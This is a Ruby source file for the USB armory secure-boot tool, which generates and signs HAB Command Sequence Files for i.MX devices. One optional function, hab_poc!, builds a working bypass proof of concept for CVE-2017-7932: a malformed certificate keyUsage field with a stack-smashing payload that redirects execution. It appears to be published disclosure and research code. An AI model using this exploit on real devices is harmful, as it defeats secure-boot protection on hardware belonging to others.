#!/usr/bin/ruby

# USB armory - Secure Boot tool - Command Sequence File (CSF) generation
#   https://github.com/inversepath/usbarmory/wiki/Secure-boot
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE.

# This tool generates a simple static CSF blob binary with the following
# command sequence:
#
# 1. Install the SRK table with SRK key selection to authenticate the CSF and
#    IMG certificates.
#
# 2. Install the CSF certificate.
#
# 3. Authenticate the CSF commands using the CSF certificate.
#
# 4. Install the IMG certificate.
#
# 5. Authenticate the IMG file using the IMG certificate.

# required gems can be installed with `gem install <name>` if missing
require 'bit-struct'
require 'digest'
require 'getoptlong'
require 'openssl'

WARNING = <<EOF

WARNING: enabling secure boot functionality on the USB armory SoC, unlike
similar features on modern PCs, is an irreversible action that permanently
fuses verification keys hashes on the device. This means that any errors in the
process or loss of the signing PKI will result in a bricked device incapable of
executing unsigned code. This is a security feature, not a bug.

EOF

SIG_FLAGS = OpenSSL::PKCS7::BINARY | OpenSSL::PKCS7::NOCERTS | OpenSSL::PKCS7::NOSMIMECAP | OpenSSL::PKCS7::DETACHED
IVT_OFFSET = 0x400 # 1k offset for SD images
DCD = 0x00910000

# High Assurance Boot version
HAB_MAJOR_VERSION = 4
HAB_MINOR_VERSION = 0

# Data structures
HAB_TAG_IVT = 0xd1  # Image Vector Table
HAB_TAG_DCD = 0xd2  # Device Configuration Data
HAB_TAG_CSF = 0xd4  # Command Sequence File
HAB_TAG_CRT = 0xd7  # Certificate
HAB_TAG_SIG = 0xd8  # Signature
HAB_TAG_EVT = 0xdb  # Event
HAB_TAG_RVT = 0xdd  # ROM Vector Table
HAB_TAG_WRP = 0x81  # Wrapped Key
HAB_TAG_MAC = 0xac  # Message Authentication Code

# Commands
HAB_CMD_SET     = 0xb1  # Set
HAB_CMD_INS_KEY = 0xbe  # Install Key
HAB_CMD_AUT_DAT = 0xca  # Authenticate Data
HAB_CMD_WRT_DAT = 0xcc  # Write Data
HAB_CMD_CHK_DAT = 0xcf  # Check Data
HAB_CMD_NOP     = 0xc0  # No Operation
HAB_CMD_INIT    = 0xb4  # Initialize
HAB_CMD_UNLK    = 0xb2  # Unlock

# Flags for Install Key command
HAB_CMD_INS_KEY_CLR = 0x00  # No flags set
HAB_CMD_INS_KEY_ABS = 0x01  # Absolute certificate address
HAB_CMD_INS_KEY_CSF = 0x02  # Install CSF key
HAB_CMD_INS_KEY_DAT = 0x04  # Key binds to Data Type
HAB_CMD_INS_KEY_CFG = 0x08  # Key binds to Configuration
HAB_CMD_INS_KEY_FID = 0x10  # Key binds to Fabrication UID
HAB_CMD_INS_KEY_MID = 0x20  # Key binds to Manufacturing ID
HAB_CMD_INS_KEY_CID = 0x40  # Key binds to Caller ID
HAB_CMD_INS_KEY_HSH = 0x80  # Certificate hash present

# Flags for Authenticate Data command
HAB_CMD_AUT_DAT_CLR = 0x00  # No flags set
HAB_CMD_AUT_DAT_ABS = 0x01  # Absolute signature address

# Protocols
HAB_PCL_SRK  = 0x03  # SRK certificate
HAB_PCL_X509 = 0x09  # X.509v3 certificate
HAB_PCL_CMS  = 0xc5  # CMS/PKCS#7 signature

# Alghoritm types
HAB_ALG_ANY    = 0x00  # Algorith type ANY
HAB_ALG_HASH   = 0x01  # Hash algorith type
HAB_ALG_SIG    = 0x02  # Signature algorithm type
HAB_ALG_F      = 0x03  # Finite field arithmetic
HAB_ALG_EC     = 0x04  # Elliptic curve arithmetic
HAB_ALG_CIPHER = 0x05  # Cipher algorithm type
HAB_ALG_MODE   = 0x06  # Cipher/Hash modes
HAB_ALG_WRAP   = 0x07  # Key wrap algorithm type

# Hash algorithms
HAB_ALG_SHA1   = 0x11  # SHA-1 algorithm ID
HAB_ALG_SHA256 = 0x17  # SHA-256 algorithm ID
HAB_ALG_SHA512 = 0x1b  # SHA-512 algorithm ID

# Engines
HAB_ENG_ANY    = 0x00  # First compatible engine
HAB_ENG_SCC    = 0x03  # Security Controller
HAB_ENG_RTIC   = 0x05  # Run-Time Interity Checker
HAB_ENG_SAHARA = 0x06  # Crypto accelerator
HAB_ENG_CSU    = 0x0a  # Central Security Unit
HAB_ENG_SRTC   = 0x0c  # Secure Clock
HAB_ENG_DCP    = 0x1b  # Data Co-Processor
HAB_ENG_CAAM   = 0x1d  # Cryptographic Acceleration and Assurance Module
HAB_ENG_SNVS   = 0x1e  # Secure Non-Volatile Storage
HAB_ENG_OCOTP  = 0x21  # Fuse controller
HAB_ENG_DTCP   = 0x22  # DTCP Co-processor
HAB_ENG_ROM    = 0x36  # Protected ROM area
HAB_ENG_HDCP   = 0x24  # HDCP co-processor
HAB_ENG_SW     = 0xff  # Software engine

class HAB
  class CSF < BitStruct
    unsigned :tag,      8, :default => HAB_TAG_CSF
    unsigned :len,     16
    unsigned :maj_ver,  4, :default => HAB_MAJOR_VERSION
    unsigned :min_ver,  4, :default => HAB_MINOR_VERSION
    rest     :body
  end

  class Certificate < BitStruct
    unsigned :tag,         8, :default => HAB_TAG_CRT
    unsigned :len,        16
    unsigned :maj_ver,     4, :default => HAB_MAJOR_VERSION
    unsigned :min_ver,     4, :default => HAB_MINOR_VERSION
    rest     :certificate
  end

  class Signature < BitStruct
    unsigned :tag,       8, :default => HAB_TAG_SIG
    unsigned :len,      16
    unsigned :maj_ver,   4, :default => HAB_MAJOR_VERSION
    unsigned :min_ver,   4, :default => HAB_MINOR_VERSION
    rest     :signature
  end

  # Image Vector Table header
  class IVT < BitStruct
    unsigned :tag,        8, :default => HAB_TAG_IVT
    unsigned :len,       16
    unsigned :maj_ver,    4, :default => HAB_MAJOR_VERSION
    unsigned :min_ver,    4, :default => HAB_MINOR_VERSION
    unsigned :entry,     32, '1st instruction pointer',  :endian => :little
    unsigned :reserved1, 32, 'reserved, should be zero', :default => 0x0000
    unsigned :dcd,       32, 'DCD pointer',              :endian => :little
    unsigned :boot_data, 32, 'Boot Data pointer',        :endian => :little
    unsigned :self,      32, 'IVT header pointer',       :endian => :little
    unsigned :csf,       32, 'CSF binary blob pointer',  :endian => :little
    unsigned :reserved2, 32, 'reserved, should be zero', :default => 0x0000

    class BootData < BitStruct
      unsigned :start,       32, 'address of boot image',             :endian => :little
      unsigned :len,         32, 'size of boot image to copy in RAM', :endian => :little
      unsigned :plugin_flag, 32, 'reserved, should be zero',          :default => 0x0000
    end
  end

  class DCD < BitStruct
    unsigned :tag,        8, :default => HAB_TAG_DCD
    unsigned :len,       16
    unsigned :maj_ver,    4, :default => HAB_MAJOR_VERSION
    unsigned :min_ver,    4, :default => HAB_MINOR_VERSION
    rest     :body
  end
end

class CSFCommand
  class InstallKey < BitStruct
    unsigned :tag,       8, :default => HAB_CMD_INS_KEY
    unsigned :len,      16
    unsigned :flg,       8, :default => 0
    unsigned :pcl,       8, :default => 0
    unsigned :alg,       8, :default => HAB_ALG_ANY
    unsigned :src,       8, :default => 0
    unsigned :tgt,       8, :default => 0
    unsigned :key_dat,  32, :default => 0
  end

  class AuthenticateData < BitStruct
    unsigned :tag,        8, :default => HAB_CMD_AUT_DAT
    unsigned :len,       16
    unsigned :flg,        8, :default => 0
    unsigned :key,        8, :default => 0
    unsigned :pcl,        8, :default => 0
    unsigned :eng,        8, :default => HAB_ENG_ANY
    unsigned :cfg,        8, :default => 0
    unsigned :aut_start, 32, :default => 0
    rest     :blks

    class Blk < BitStruct
      unsigned :blk_start, 32
      unsigned :blk_bytes, 32
    end
  end
end

def help
  puts <<EOF
Usage: usbarmory_csftool [OPTIONS]
  -A | --csf_key <private key path>  CSF private key in PEM format
  -a | --csf_crt <public  key path>  CSF public  key in PEM format
  -B | --img_key <private key path>  IMG private key in PEM format
  -b | --img_crt <public  key path>  IMG public  key in PEM format
  -I | --table   <SRK table path>    Input SRK table (see usbarmory_srktool -O)
  -x | --index   <SRK key index>     Index for SRK key (1-4)
  -i | --image   <filename>          Image file w/ IVT header (e.g. u-boot.imx)
  -o | --output  <filename>          Write CSF to file
  -s | --serial                      Serial download mode
  -S | --dcd     <address>           Serial download DCD OCRAM address
     |                                (depends on mfg tool, default: 0x00910000)
     |
  -d | --debug                       Show additional debugging information
  -T | --hab_poc                     Apply HAB bypass PoC (CVE-2017-7932)
     |
  -h | --help                        Show this help
EOF
end

def hab_poc!(cert)
  puts 'Modifying certificate for HAB bypass PoC (CVE-2017-7932)'

  # stack smashing of 37 bytes + PC at 0x77800000 (U-Boot image entry point)
  payload = "\x00" + "\x00\x00\x00\x00" * 9 + "\x00\x00\x80\x77" + "\x00\x00\x00\x00"
  payload_len = payload.length

  # RFC 5280 description of keyUsage tag:
  #
  # SEQUENCE {
  #  OBJECT IDENTIFIER keyUsage (2 5 29 15)
  #    BOOLEAN TRUE
  #    OCTET STRING, encapsulates {
  #      BIT STRING 1 unused bits
  #        '0000011'B
  #      }
  #    }
  #
  # We generate a malformed keyUsage tag with an unexpectedly long BIT STRING
  # object with stack smashing payload.
  #
  malformed_key_usage = "\x30" + [9 + payload_len].pack('C')  # SEQUENCE (9 + payload_len)
  malformed_key_usage += "\x06\x03"                           # OBJECT_ID (3 bytes)
  malformed_key_usage += "\x55\x1D\x0F"                       # OBJECT_ID: 2.5.29.15 (keyUsage)
  malformed_key_usage += "\x04" + [2 + payload_len].pack('C') # OCTET STRING (2 bytes + payload_len)
  malformed_key_usage += "\x03" + [payload_len].pack('C')     # BIT STRING (payload_len)
  malformed_key_usage += payload

  # 0x1f0 is the insertion offset for keyUsage SEQUENCE, specific for
  # Makefile-pki generated certs
  cert.insert(0x1f0, malformed_key_usage.force_encoding('binary'))

  # adjust outer SEQUENCE lengths
  cert[0x02..0x03] = [cert[0x02..0x03].unpack('n')[0] + malformed_key_usage.length].pack('n')
  cert[0x06..0x07] = [cert[0x06..0x07].unpack('n')[0] + malformed_key_usage.length].pack('n')

  # adjust cont [3] tag and its following SEQUENCE lengths
  tag_length = [cert[0x1a2].unpack('C')[0] + malformed_key_usage.length][0]
  seq_length = [cert[0x1a4].unpack('C')[0] + malformed_key_usage.length][0]

  max_length = [tag_length, seq_length].max

  if max_length < 0x80
    # short form (i.e. length is 1 octet)
    cert[0x1a2] = [tag_length].pack('C') # cont [3] length
    cert[0x1a4] = [seq_length].pack('C') # SEQUENCE length
  elsif max_length <= 0xff
    # we gain 2 additional octets, adjust previously modified outer SEQUENCE lengths
    cert[0x02..0x03] = [cert[0x02..0x03].unpack('n')[0] + 2].pack('n')
    cert[0x06..0x07] = [cert[0x06..0x07].unpack('n')[0] + 2].pack('n')

    # long form (ITU-T Rec. X.690 8.1.3.5)
    cert[0x1a2] = [0b10000001].pack('C')
    cert[0x1a4] = [0b10000001].pack('C')

    # adjust cont [3] tag and its following SEQUENCE lengths to long form
    cert.insert(0x1a3,     [tag_length + 1].pack('C'))
    cert.insert(0x1a5 + 1, [seq_length].pack('C'))
  else
    raise 'unsupported payload length'
  end
end

opts = GetoptLong.new(
  ['--debug',   '-d', GetoptLong::NO_ARGUMENT],
  ['--csf_key', '-A', GetoptLong::REQUIRED_ARGUMENT],
  ['--csf_crt', '-a', GetoptLong::REQUIRED_ARGUMENT],
  ['--img_key', '-B', GetoptLong::REQUIRED_ARGUMENT],
  ['--img_crt', '-b', GetoptLong::REQUIRED_ARGUMENT],
  ['--table',   '-I', GetoptLong::REQUIRED_ARGUMENT],
  ['--index',   '-x', GetoptLong::REQUIRED_ARGUMENT],
  ['--image',   '-i', GetoptLong::REQUIRED_ARGUMENT],
  ['--output',  '-o', GetoptLong::REQUIRED_ARGUMENT],
  ['--serial',  '-s', GetoptLong::NO_ARGUMENT],
  ['--dcd',     '-S', GetoptLong::REQUIRED_ARGUMENT],
  ['--help',    '-h', GetoptLong::NO_ARGUMENT],
  ['--hab_poc', '-T', GetoptLong::NO_ARGUMENT]
)

begin
  @debug = false
  serial_mode = false
  serial_dcd = DCD
  hab_bypass = false
  csf_k, csf_c, img_k, img_c, srk_t, srk_i, image_file, output_file = nil

  opts.each do |opt, arg|
    case opt
    when '--csf_key' then csf_k = arg
    when '--csf_crt' then csf_c = arg
    when '--img_key' then img_k = arg
    when '--img_crt' then img_c = arg
    when '--table'   then srk_t = arg
    when '--index'   then srk_i = arg
    when '--image'   then image_file = arg
    when '--output'  then output_file = arg
    when '--debug'   then @debug = true
    when '--serial'  then serial_mode = true
    when '--dcd'     then serial_dcd = arg.hex
    when '--hab_poc' then hab_bypass = true
    when '--help'
      help
      exit(0)
    end
  end

  unless csf_k and csf_c and img_k and img_c and srk_t and srk_i and image_file and output_file
    puts 'Error: CSF and IMG private/public keys, SRK table, SRK index, image and output files must all be specified!'
    help
    exit(1)
  end

  srk_table = File.binread(srk_t)
  img_file  = File.binread(image_file)

  ivt = HAB::IVT.new(img_file)

  if ivt.tag != HAB_TAG_IVT
    puts 'Error: IVT header not found'
    exit(1)
  end

  boot_data_offset = ivt.boot_data - ivt.self
  boot_data = HAB::IVT::BootData.new(img_file[boot_data_offset..-1])
  csf_pad_to = boot_data.len - img_file.length - IVT_OFFSET

  if @debug
    puts 'IVT values:'
    puts "  entry:                 0x#{ivt.entry.to_s(16)}"
    puts "  dcd:                   0x#{ivt.dcd.to_s(16)}"
    puts "  boot_data:             0x#{ivt.boot_data.to_s(16)}"
    puts "  self:                  0x#{ivt.self.to_s(16)}"
    puts "  csf:                   0x#{ivt.csf.to_s(16)}"
    puts "  boot_data.start:       0x#{boot_data.start.to_s(16)}"
    puts "  boot_data.length:      0x#{boot_data.len.to_s(16)}"
    puts "  boot_data.plugin_flag: 0x#{boot_data.plugin_flag.to_s(16)}"
    puts "CSF padding size:        0x#{csf_pad_to.to_s(16)}"
  end

  img_start = ivt.self
  img_bytes = img_file.length

  puts 'Reading CSF key'
  csf_pkey = OpenSSL::PKey::RSA.new(File.read(csf_k))
  csf_cert = OpenSSL::X509::Certificate.new File.read(csf_c)

  puts 'Reading IMG key'
  img_pkey = OpenSSL::PKey::RSA.new(File.read(img_k))
  img_cert = OpenSSL::X509::Certificate.new File.read(img_c)

  # Prepare CSF commands

  # [Header]
  csf = HAB::CSF.new
  csf.len = csf.length

  # [Install SRK]
  install_srk     = CSFCommand::InstallKey.new
  install_srk.flg = HAB_CMD_INS_KEY_CLR
  install_srk.pcl = HAB_PCL_SRK
  install_srk.alg = HAB_ALG_SHA256
  install_srk.src = (srk_i.to_i - 1)
  install_srk.len = install_srk.length
  csf.len += install_srk.len

  # [Install CSFK]
  install_csfk     = CSFCommand::InstallKey.new
  install_csfk.flg = HAB_CMD_INS_KEY_CSF
  install_csfk.pcl = HAB_PCL_X509
  install_csfk.tgt = 1 # Target Index = 1
  install_csfk.len = install_csfk.length
  csf.len += install_csfk.len

  # [Authenticate CSF]
  authenticate_csf     = CSFCommand::AuthenticateData.new
  authenticate_csf.tag = HAB_CMD_AUT_DAT
  authenticate_csf.flg = HAB_CMD_AUT_DAT_CLR
  authenticate_csf.key = 1
  authenticate_csf.pcl = HAB_PCL_CMS
  authenticate_csf.len = authenticate_csf.length
  csf.len += authenticate_csf.len

  # [Install Key]
  install_img     = CSFCommand::InstallKey.new
  install_img.pcl = HAB_PCL_X509
  install_img.tgt = 2 # Target Index = 2
  install_img.len = install_img.length
  csf.len += install_img.len

  # [Authenticate Data]
  authenticate_data     = CSFCommand::AuthenticateData.new
  authenticate_data.tag = HAB_CMD_AUT_DAT
  authenticate_data.flg = HAB_CMD_AUT_DAT_CLR
  authenticate_data.key = 2 # Verification Index = 2
  authenticate_data.pcl = HAB_PCL_CMS
  blk = CSFCommand::AuthenticateData::Blk.new
  blk.blk_start = img_start
  blk.blk_bytes = img_bytes
  authenticate_data.blks = blk
  authenticate_data.len = authenticate_data.length
  csf.len += authenticate_data.len

  if serial_mode
    puts 'Serial download mode:'
    dcd_start = ivt.dcd - ivt.self
    dcd_len = HAB::DCD.new(img_file[dcd_start..img_bytes]).len
    puts "  DCD starts at 0x#{dcd_start.to_s(16)}, length 0x#{dcd_len.to_s(16)}"
    puts "  DCD OCRAM address 0x#{serial_dcd.to_s(16)}"

    # [Authenticate Data] for dcd block
    authenticate_dcd     = CSFCommand::AuthenticateData.new
    authenticate_dcd.tag = HAB_CMD_AUT_DAT
    authenticate_dcd.flg = HAB_CMD_AUT_DAT_CLR
    authenticate_dcd.key = 2 # Verification Index = 2
    authenticate_dcd.pcl = HAB_PCL_CMS
    blk_dcd = CSFCommand::AuthenticateData::Blk.new
    blk_dcd.blk_start = serial_dcd  # DCD location in ocram in Serial download mode
    blk_dcd.blk_bytes = dcd_len
    authenticate_dcd.blks = blk_dcd
    authenticate_dcd.len = authenticate_dcd.length
    csf.len += authenticate_dcd.len

    # clear DCD pointer in IVT since Serial download mode will do the same on loading the image
    img_file[0x0c..0x0f] = "\0\0\0\0"
  end

  # CSF body

  csf_key = HAB::Certificate.new
  tmp = csf_cert.to_der

  if hab_bypass
    hab_poc!(tmp)
  end

  pad_size = (4 - (tmp.length % 4)) % 4
  csf_key.certificate = tmp.ljust(tmp.length + pad_size, "\0")
  csf_key.len  = csf_key.length

  img_key = HAB::Certificate.new
  tmp = img_cert.to_der
  pad_size = (4 - (tmp.length % 4)) % 4
  img_key.certificate = tmp.ljust(tmp.length + pad_size, "\0")
  img_key.len  = img_key.length

  # Sign the image
  img_sig = HAB::Signature.new
  tmp = OpenSSL::PKCS7.sign(img_cert, img_pkey, img_file, nil, SIG_FLAGS).to_der
  pad_size = (4 - (tmp.length % 4)) % 4
  img_sig.signature = tmp.ljust(tmp.length + pad_size, "\0")
  img_sig.len = img_sig.length

  if serial_mode
    # Sign the DCD block
    dcd_sig = HAB::Signature.new
    tmp = OpenSSL::PKCS7.sign(img_cert, img_pkey, img_file[dcd_start..(dcd_start+dcd_len-1)], nil, SIG_FLAGS).to_der
    pad_size = (4 - (tmp.length % 4)) % 4
    dcd_sig.signature = tmp.ljust(tmp.length + pad_size, "\0")
    dcd_sig.len = dcd_sig.length
  end

  # Set CSF commands offsets
  signature_length = img_sig.length
  install_srk.key_dat         = csf.len
  install_csfk.key_dat        = csf.len                    + srk_table.length
  authenticate_csf.aut_start  = install_csfk.key_dat       + csf_key.len
  install_img.key_dat         = authenticate_csf.aut_start + signature_length
  authenticate_data.aut_start = install_img.key_dat        + img_key.len

  if hab_bypass
    if serial_mode
      raise 'Serial download mode flag is unsupported with HAB bypass PoC'
    end

    # deliver HAB bypass Poc payload first, to demonstrate no prior key material knowledge
    csf.body = install_csfk + install_srk + authenticate_csf + install_img + authenticate_data
  else
    csf.body = install_srk + install_csfk + authenticate_csf + install_img + authenticate_data

    if serial_mode
      authenticate_dcd.aut_start  = authenticate_data.aut_start + img_sig.len
      csf.body += authenticate_dcd
    end
  end

  # Sign the CSF commands
  csf_sig = HAB::Signature.new
  tmp = OpenSSL::PKCS7.sign(csf_cert, csf_pkey, csf, nil, SIG_FLAGS).to_der
  pad_size = (4 - (tmp.length % 4)) % 4
  csf_sig.signature = tmp.ljust(tmp.length + pad_size, "\0")
  csf_sig.len = csf_sig.length

  csf.body += srk_table + csf_key + csf_sig + img_key + img_sig

  if serial_mode
    csf.body += dcd_sig
  end

  if csf.length > csf_pad_to
    raise "unexpected CSF length (#{csf.length} > #{csf_pad_to}) (HINT: verify u-boot is compiled with CSF parameter set in imximage.cfg), aborting"
  elsif csf.length < csf_pad_to
    csf.body += "\x00" * (csf_pad_to - csf.length)
  end

  if csf.length != csf_pad_to
    raise "unexpected CSF length #{csf.length}, aborting"
  end

  File.open(output_file, 'w+').write(csf)

  puts WARNING
  puts "CSF file written to #{output_file}"
rescue GetoptLong::InvalidOption, ArgumentError => e
  puts "Error: #{e.message}" unless e.to_s.empty?
  help
  exit(1)
end
